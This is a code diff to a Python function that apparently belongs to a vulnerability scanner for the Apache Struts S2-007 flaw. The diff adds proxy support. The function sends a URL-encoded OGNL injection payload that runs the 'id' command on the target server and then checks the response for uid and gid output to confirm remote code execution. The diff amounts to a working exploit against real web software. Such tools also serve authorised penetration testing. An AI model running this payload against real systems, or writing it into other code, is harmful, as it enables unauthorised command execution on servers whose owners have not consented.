@@ -17,7 +17,7 @@ def UrlProcessing(url):
 
 payload='''
 name=111&email=11&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27'''
-def S2_007(Url,RandomAgent):
+def S2_007(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -43,7 +43,15 @@ def S2_007(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
+        if ProxyIp!=None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.post(payload_url, data=payload, headers=headers, proxies=proxies ,timeout=5, verify=False)
+
+        elif ProxyIp==None:
+            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1 and con.lower().find('groups')!=-1:
